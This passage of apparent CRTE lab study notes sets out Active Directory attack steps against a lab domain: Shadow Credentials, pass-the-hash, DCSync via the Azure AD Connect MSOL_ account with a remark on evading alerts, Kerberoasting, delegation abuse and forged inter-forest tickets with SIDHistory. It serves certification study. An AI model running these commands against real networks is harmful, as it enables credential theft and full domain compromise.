  <li>User to User (U2U) Service Ticket can be requested to decrypt the encrypted <strong>NTLM_SUPPLEMENTAL_CREDENTIAL</strong> entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.</li>
</ul>

<p>Pre-requisites to abuse Shadow Credentials:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- AD CS (Key Trust if AD CS is not present)
- Support for PKINIT and at least one DC with Windows Server 2016 or above.
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.
</code></pre></div></div>

<h2 id="abusing-user-object">Abusing User Object</h2>

<p>Enumerate the permissions:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"StudentUsers"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Add the Shadow Credential:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Whisker.exe</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">/target:supportXuser</span><span class="w">
</span></code></pre></div></div>

<p>Using PowerView, see if the Shadow Credential is added.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">supportXuser</span><span class="w">
</span></code></pre></div></div>

<p>Request the TGT by leveraging the certificate:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:supportXuser</span><span class="w"> </span><span class="nx">/certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW....</span><span class="w"> </span><span class="nx">/password:</span><span class="s2">"1OT0qAom3..."</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/dc:US-DC.us.techcorp.local</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div></div>

<p>Inject the TGT in the current session or use the NTLM hash:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIGgDCCBnygAwIBBaEDAgEW...</span><span class="w">
</span></code></pre></div></div>

<h2 id="abusing-computer-object">Abusing Computer Object</h2>

<p>Enumerate the permissions:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'mgmtadmin’}
</span></code></pre></div></div>

<p>Add the Shadow Credentials:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Whisker.exe</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">/target:us-helpdesk</span><span class="err">$</span><span class="w">
</span></code></pre></div></div>

<p>Using PowerView, see if the Shadow Credential is added:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">us-helpdesk</span><span class="w">
</span></code></pre></div></div>

<p>Request the TGT by leveraging the certificate:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:us-helpdesk</span><span class="err">$</span><span class="w"> </span><span class="nx">/certificate:MIIJ0AIBAzCCCYwGCSqGSIb...</span><span class="w"> </span><span class="nx">/password:</span><span class="s2">"ViGFoZJa..."</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/dc:US-DC.us.techcorp.local</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/show</span><span class="w">
</span></code></pre></div></div>

<p>Request and Inject the TGS by impersonating the user:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/dc:us-dc.us.techcorp.local</span><span class="w"> </span><span class="nx">/ticket:doIGkDCCBoygAwIBBaEDAgEW...</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> </span><span class="nx">/self</span><span class="w"> </span><span class="nx">/altservice:cifs/us-helpdesk</span><span class="w">
</span></code></pre></div></div>

<h1 id="azure-ad-integration">Azure AD Integration</h1>

<p>Azure AD is a popular method to extend identity management from on-premises AD to Microsoft’s Azure offerings.</p>

<ul>
  <li>Many enterprises use their on-prem AD identities to access Azure applications.</li>
</ul>

<blockquote>
  <p>A single user identity for authentication and authorization to all resources, regardless of location is hybrid identity.</p>
</blockquote>

<p>An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Password Hash Sync (PHS)
- Pass-Through Authentication (PTA)
- Federation
</code></pre></div></div>

<blockquote>
  <p>Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!</p>
</blockquote>

<h2 id="phs">PHS</h2>

<blockquote>
  <p>Let’s target PHS.</p>
</blockquote>

<ul>
  <li>It shares users and their password hashes from on-premises AD to Azure AD.</li>
  <li>A new users <strong>MSOL_</strong> is created which has Synchronization rights (DCSync) on the domain!</li>
</ul>

<p><img src="/assets/images/posts/crte/3.png" alt="Alt text" class="align-center" /></p>

<p><strong>Enumerate the PHS account and server where AD Connect is installed</strong></p>

<p>Using PowerView:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"MSOL_*"</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">techcorp.local</span><span class="w">
</span></code></pre></div></div>

<p>Using the ActiveDirectory module:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"samAccountName -like 'MSOL_*'"</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">techcorp.local</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="p">,</span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>We already have administrative access to us-adconnect as helpdeskadmin.</p>
</blockquote>

<p>With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\adconnect.ps1</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>[Note] The above script’s code runs powershell.exe so verbose logs (like transcripts) will be there.</p>
</blockquote>

<p>With the password, we can run commands as <strong>MSOL_</strong>:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:techcorp.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div></div>

<p>And can then execute the DCSync attack:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:us\krbtgt"'</span><span class="w">
</span><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>[NOTE] Because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the <strong>MSOL_</strong> account will be <strong>excluded from tools like MDI</strong>!</p>
</blockquote>

<blockquote>
  <p>This will allow us to run DCSync without any alerts!</p>
</blockquote>

<h1 id="forest-root">Forest Root</h1>

<ul>
  <li>Child to Forest Root - Trust Key</li>
  <li>Child to Forest Root - krbtgt</li>
</ul>

<p>same material of CRTP:</p>

<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domprivesc/#privesc---across-trusts">CRTP - Privesc Across Trusts</a></p>

<h1 id="kerberoast-across-forest-trusts">Kerberoast across Forest Trusts</h1>

<blockquote>
  <p>It is possible to execute Kerberoast across Forest trusts.</p>
</blockquote>

<p><strong>Let’s enumerate named service accounts across forest trusts</strong></p>

<p>Using PowerView:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'FILTER_SIDS'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TargetName</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Using ActiveDirectory Module:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'IntraForest -ne $true'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ServicePrincipalName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">ServicePrincipalName</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Request a TGS:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/simple</span><span class="w"> </span><span class="nx">/domain:eu.local</span><span class="w"> </span><span class="nx">/outfile:euhashes.txt</span><span class="w">
</span></code></pre></div></div>

<p>Check for the TGS:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
</span></code></pre></div></div>

<p>Crack using John:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john.exe</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">C:\AD\Tools\kerberoast\10k-worst-pass.txt</span><span class="w"> </span><span class="nx">C:\AD\Tools\hashes.txt</span><span class="w">
</span></code></pre></div></div>

<p>Request TGS across trust using PowerShell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IdentityModel</span><span class="w">
</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nx">MSSQLSvc/eu-file.eu.local</span><span class="err">@</span><span class="nx">eu.local</span><span class="w">
</span></code></pre></div></div>

<h1 id="delegations">Delegations</h1>

<h2 id="constrained-delegation-with-protocol-transition">Constrained Delegation with Protocol Transition</h2>

<blockquote>
  <p>The classic Constrained Delegation does not work across forest trusts.
But we can abuse it once we have a foothold across forest trust.</p>
</blockquote>

<p>Using PowerView:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="err">–</span><span class="nx">TrustedToAuth</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">eu.local</span><span class="w">
</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="err">–</span><span class="nx">TrustedToAuth</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">eu.local</span><span class="w">
</span></code></pre></div></div>

<p>Using ActiveDirectory module:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div></div>

<p>We can request an alternate ticket using Rubeus:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Qwerty</span><span class="err">@</span><span class="nx">2019</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/rc4:5C76877A9C454CDED58807C20C20AEAC</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/msdsspn:nmagent/dc.domain.local</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<p>Abuse the TGS to LDAP:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'</span><span class="w">
</span></code></pre></div></div>
<p>Or</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span></code></pre></div></div>

<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>

<blockquote>
  <p>Recall the Printer bug and its abuse from a machine with Unconstrained Delegation</p>
</blockquote>

<ul>
  <li>We have used it to escalate privileges to Domain Admin and Enterprise Admin.</li>
  <li>It also works across a Two-way forest trust with TGT Delegation enabled!</li>
</ul>

<blockquote>
  <p>TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.</p>
</blockquote>

<p>To enumerate if TGTDelegation is enabled across a forest trust, run the below command from a DC</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netdom</span><span class="w"> </span><span class="nx">trust</span><span class="w"> </span><span class="nx">trustingforest</span><span class="w"> </span><span class="nx">/domain:trustedforest</span><span class="w"> </span><span class="nx">/EnableTgtDelegation</span><span class="w">
</span></code></pre></div></div>

<p>In the lab, this is to be run on usvendor-dc</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netdom</span><span class="w"> </span><span class="nx">trust</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nx">/domain:techcorp.local</span><span class="w"> </span><span class="nx">/EnableTgtDelegation</span><span class="w">
</span></code></pre></div></div>

<p>The PowerShell cmdlets of the ADModule seems to have a bug, the below command shows TGTDelegation set to False:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-server</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>But when run from usvendor-dc, it shows TGTDelegation to be True</p>
</blockquote>

<h1 id="across-forest-using-trust-tickets">Across Forest using Trust Tickets</h1>

<blockquote>
  <p>By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary.</p>
</blockquote>

<ul>
  <li>We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.</li>
  <li>Let’s try to access a file share ‘eushare’ on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.</li>
</ul>

<blockquote>
  <p><em>There is content about this in CRTP</em></p>
</blockquote>

<p>Like intra forest scenario, we require the trust key for the inter-forest trust:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::trust /patch"'</span><span class="w">
</span></code></pre></div></div>
<p>or</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:eu\euvendor$"'</span><span class="w">
</span></code></pre></div></div>
<p>or</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>We can also use any of the earlier discussed tools to extract trust keys.</p>
</blockquote>

<p>An inter-forest TGT can be forged:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
	/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'</span><span class="w">
</span></code></pre></div></div>

<p>Get a TGS for a service (CIFS below) in the target forest by using the forged trust ticket:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\AD\Tools\kekeo_old\sharedwitheu.kirbi</span><span class="w"> </span><span class="nx">CIFS/euvendor-dc.euvendor.local</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well</p>
</blockquote>

<p>Use the TGS to access the target resource which must be explicitly shared:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="nx">CIFS.euvendor-dc.euvendor.local.kirbi</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\euvendor-dc.euvendor.local\eushare\</span><span class="w">
</span></code></pre></div></div>

<p>We can also use Rubeus:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\sharedwitheu.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/dc:euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>This is fine but why can’t we access all resources just like Intra forest?</li>
  <li><strong>SID Filtering</strong> is the answer.</li>
  <li>It filters high privilege SIDs from the <strong>SIDHistory</strong> of a TGT crossing forest boundary.</li>
  <li>This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.</li>
</ul>

<blockquote>
  <p>But there is a catch:</p>
</blockquote>

<p><img src="/assets/images/posts/crte/4.png" alt="Alt text" class="align-center" /></p>

<p>Reference:</p>

<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">MS-PAC: Privilege Attribute Certificate Data Structure</a></p>

<blockquote>
  <p>This means, if we have an external trust (or a forest trust with SID history enabled -/enablesidhistory:yes), we can inject a <strong>SIDHistory for RID &gt; 1000</strong> to access resources accessible to that identity or group in the target trusting forest.</p>
</blockquote>

<p>We had DA access to eu.local. Let’s enumerate trusts from a PSRemoting session on eu-dc:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><strong>SIDFilteringForestAware</strong> is set to <strong>True</strong>, it means SIDHistory is enabled across the forest trust.</li>
</ul>

<p>Please remember that still only RID &gt; 1000 SIDs will be allowed across the trust boundary:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">EUAdmins</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">euvendor.local</span><span class="w">
</span></code></pre></div></div>

<p>From eu-dc, create a TGT with SIDHistory of EUAdmins group:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'</span><span class="w">
</span></code></pre></div></div>

<p>Request a TGS:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\Users\Public\euvendornet.kirbi</span><span class="w"> </span><span class="nx">HTTP/euvendor-net.euvendor.local</span><span class="w">
</span></code></pre></div></div>

<p>Inject that into current session:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="nx">HTTP.euvendor-net.euvendor.local.kirbi</span><span class="w">
</span></code></pre></div></div>
<p>Or</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\euvendornet.kirbi</span><span class="w"> </span><span class="nx">/service:HTTP/euvendor-net.euvendor.local</span><span class="w"> </span><span class="nx">/dc:euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>

<p>Access the euvendor-net machine using PSRemoting:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="n">euvendor-net.euvendor.local</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
</span></code></pre></div></div>

<h1 id="trust-abuse-mssql-servers">Trust Abuse (MSSQL Servers)</h1>

<p>Same material as in the CRTP:</p>

<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domprivesc/#trust-abuse---mssql-servers">CRTP - Trust Abuse (MSSQL Servers)</a></p>

<h1 id="foreign-security-principals">Foreign Security Principals</h1>

<blockquote>
  <p>A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).</p>
</blockquote>

<ul>
  <li>Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.</li>
  <li>FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.</li>
  <li>Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.</li>
</ul>

<p>PowerView:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-ForeignGroup</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Find-ForeignUser</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div></div>

<p>Using ActiveDirectory module:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Access to resources in a forest trust can also be provided without using FSPs using ACLs.</li>
  <li>Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group</li>
</ul>

<p>Let’s enumerate ACLs for the dbvendor.local domain using the reverse shell we have on db.local:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w">
</span></code></pre></div></div>

<h1 id="abusing-pam-trust">Abusing PAM Trust</h1>

<blockquote>
  <p>PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.</p>
</blockquote>

<ul>
  <li>PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.</li>
  <li>To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.</li>
</ul>

<blockquote>
  <p>By enumerating trusts and hunting for access, we can enumerate that we have Administrative access in other forest.</p>
</blockquote>

<p>From techcorp-dc:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">bastion.local</span><span class="w">
</span></code></pre></div></div>

<p>On bastion-dc, enumerate if there is a PAM trust:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$bastiondc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nx">bastion-dc.bastion.local</span><span class="w">
